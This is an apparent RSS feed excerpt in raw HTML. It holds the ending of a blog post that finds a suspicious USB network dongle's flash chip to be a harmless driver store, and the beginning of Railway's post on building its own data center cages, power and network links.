https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><em>This is how we used to hack.</em></figcaption></figure></div><p>If you want to try it, be aware that it requires Intel Pentium 166MHz or above.</p><p><span>Corroborating the findings, the main archive also included a document titled </span><em>“SR9900(A)设计前必看.docx”.</em><span> The doc contained the following (auto-translated) passage:</span></p><blockquote><p><em>“When SR9900 is used as a USB network card (consumer computer peripheral market), the SPI can be used as a virtual optical drive when installing the windows system driver (SPI-flash will pre-burn the SR9900 driver under the windows system)”</em></p></blockquote><p>It also underscored that the use of the flash chip was optional.</p><p><span>So there you have it; the predictable, anticlimactic conclusion is that </span><em>weird</em><span> is not always </span><em>bad. </em><span>To get to that point, we didn’t need a hardware lab; a bit of patience and Google-fu was enough.</span></p><p><span>To be fair, we’re leaving one stone unturned: the SR9900 IC itself contains two small microcontroller cores — USB and Ethernet — each running some internal code. If we felt the chip maker was somehow complicit, I think it would be possible to peek inside. Realtek provides an open-source </span><a href="https://github.com/awesometic/realtek-r8152-dkms/blob/master/src/r8152.c#L5834" rel="">Linux driver</a><span> for RTL8152 that does some in-memory patching of the firmware; to my eye, there doesn’t appear to be any encryption or signing going on.</span></p><p><span>Should you be worried about the possibility of being sent an evil USB dongle from faraway lands? If you’re a scientist working on the Iranian nuclear program, probably! If you’re a CISO of a strategically important civilian business, some caution would be advised too: there might be an intelligence analyst with a spreadsheet of all your vendors, </span><em>just in case.</em></p><p>But for home networking, it seems that we get to live another day.</p><p><em>If you liked this article, please subscribe! Unlike most other social media, Substack is not a walled garden and not an addictive doomscrolling experience. It’s just a way to stay in touch with the writers you like.</em></p></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[So You Want to Build Your Own Data Center (207 pts)]]></title>
            <link>https://blog.railway.com/p/data-center-build-part-one</link>
            <guid>42743019</guid>
            <pubDate>Fri, 17 Jan 2025 20:41:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.railway.com/p/data-center-build-part-one">https://blog.railway.com/p/data-center-build-part-one</a>, See on <a href="https://news.ycombinator.com/item?id=42743019">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><p><span>Since the beginning, Railway’s compute has been built on top of Google Cloud Platform. The platform supported Railway's initial journey, but it has caused a multitude of problems that have posed an existential risk to our business. More importantly, building on a hyperscaler prevents us from delivering the best possible platform to our customers. </span></p><p><span>It directly affected the pricing we could offer (egress fees anyone?), limited the level of service we could deliver, and introduced engineering constraints that restricted the features we could build. </span></p><p><span>And not only is it </span><a href="https://github.com/GoogleCloudPlatform/guest-agent/issues/401" target="_blank" rel="noreferrer noopener"><span>rare</span></a><span> that we understand </span><a href="https://blog.railway.com/p/2023-12-01-incident-report" target="_blank" rel="noreferrer noopener"><span>why</span></a><span> </span><a href="https://x.com/JustJake/status/1667478906591666176" target="_blank" rel="noreferrer noopener"><span>things</span></a><span> </span><a href="https://blog.railway.com/p/incident-december-16-2024" target="_blank" rel="noreferrer noopener"><span>break</span></a><span> upstream, but also despite multi-million dollar annual spend, we get about as much support from them as you would spending $100. </span></p><p><span>So in response, we kicked off a Railway Metal project last year. Nine months later we were live with the first site in California, having designed, spec-ed, and installed everything from the fiber optic cables in the cage to the various contracts with ISPs. We’re lighting up three more data center regions as we speak.</span></p><p><span>To deliver an “infra-less” cloud experience to our customers, we’ve needed to get good fast at building out our own physical infrastructure. That’s the topic of our blogpost today.</span></p><p><a href="https://blog.railway.com/p/data-center-build-part-one#so-you-want-to-build-a-cloud"><h2><span>So you want to build a cloud</span></h2></a></p><p><span>From kicking off the Railway Metal project in October last-year, it took us five long months to get the first servers plugged in. It took us an additional three months before we felt comfortable letting our users onto the hardware. </span></p><p><span>The first step was finding some space.</span></p><p><span>When you go “on-prem” in cloud-speak, you need somewhere to put your shiny servers and reliable power to keep them running. Also you want enough cooling so they don’t melt down. </span></p><p><span>In general you have three main choices: Greenfield buildout (buying or leasing a datacenter), Cage Colocation (getting a private space inside a provider's  datacenter enclosed by mesh walls), or Rack colocation (leasing individual racks or partitions of racks in a colocation datacenter). </span></p><p><span>We chose the second option: a cage to give us four walls, a secure door, and a blank slate for everything else.</span></p><div><p><img alt="A cage before any racks have been fitted" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4d2fcf19-fcb5-4981-9003-958d82fef28d%2FCleanShot_2025-01-15_at_23.34.372x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D3ffe2b4c0409224d75cb10b42f707b6e2c656384affc7314a073fb6f4e9d6ae6%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>A cage before any racks have been fitted</p></div><p><span>The space itself doesn’t cost much, but power (and by proxy, cooling) costs the most. Depending on the geography, the $/kW rate can vary hugely — on the US west coast for example we may pay less than half as much as we pay in Singapore. Power is paid for as a fixed monthly commit, regardless of whether its consumed or not, to guarantee it will be available on-demand.</span></p><p><span>But how much power do you need?</span></p><p><a href="https://blog.railway.com/p/data-center-build-part-one#with-great-power-comes-great-responsibility"><h2><span>With great power comes great responsibility</span></h2></a></p><p><span>Ideally if you’ve embarked on your data center migration mission, you should have an idea of the rough amount of compute you want to deploy. We started with a target number of vCPUs, GBs of RAM, and TBs of NVMe to match our capacity on GCP. </span></p><p><span>Using these figures, we converged on a server and CPU choice. There are many knobs to turn when doing this computation — probably worth a blogpost in itself — but the single biggest factor for us was power density e.g. how do we get the compute density we want inside of a specific power draw. </span></p><p><span>The calculations aren’t as simple as summing watts though, especially with 3-phase feeds — Cloudflare has </span><a href="https://blog.cloudflare.com/an-introduction-to-three-phase-power-and-pdus/" target="_blank" rel="noreferrer noopener"><span>a great blogpost</span></a><span> covering this topic.</span></p><p><span>Power is the most critical resource for data centers, and a power outage can have extremely long recovery times. So redundancy is critical, and it’s important to have two fully independent power feeds per rack. Both feeds will share load under normal operation, but the design must be resilient to a feed going down.</span></p><p><span>To deliver this power to your servers, you’ll also want a Power Distribution Unit, which you'll  select based on the number of sockets and management features it provides. The basic ones are glorified extension cords, while the ones we deploy allow control and metering of individual sockets.</span></p><div><p><img alt="Each PDU is accessible over the network and individual sockets can be remotely metered and controlled" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F4e660a9b-7df3-40f6-a484-f80355b6bb41%2F880a21c2-366b-445e-951e-a03a68515796.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D2728c9d2cf17606998c46b73ad69a154a737e5319b6dcb28c073cacd14c153d5%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>Each PDU is accessible over the network and individual sockets can be remotely metered and controlled</p></div><p><span>With that, power is now available in the cage.</span></p><p><a href="https://blog.railway.com/p/data-center-build-part-one#let-there-be-light"><h2><span>Let there be light</span></h2></a></p><p><span>No cloud machine is an island </span><span>and that's where networks come into play. </span></p><p><span>To achieve the lowest possible latency on Railway, we need to set you up with solid connections to the rest of the world. </span></p><p><span>We look for DC facilities that are on-network with Tier 1 Internet Services Providers (ISPs), that are part of an Internet Exchange (IX), and that have available fiber to other data centers in close proximity. </span></p><div><p><img alt="Each cage gets diverse and redundant network links" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F38a127b8-ac2a-49ba-89fc-899125b85afc%2Fd0c2e2d8-dd9d-4917-8178-062572bc3ff4.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Ded22b50b7f4172c5afdf9044d269ecac72d78cdce3728bfe8542f63d36967207%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>Each cage gets diverse and redundant network links</p></div><p><span>Your applications deployed to Railway will want to connect to a diverse mix of endpoints over the network — be it a home internet user in Sydney, Australia or a API hosted on an AWS server in the US. To get you the best possible latency and the lowest bandwidth cost, we contract with a mix of internet providers optimized for each use case.</span></p><p><span>We select ISPs for the maturity of their networks in each geography we target. 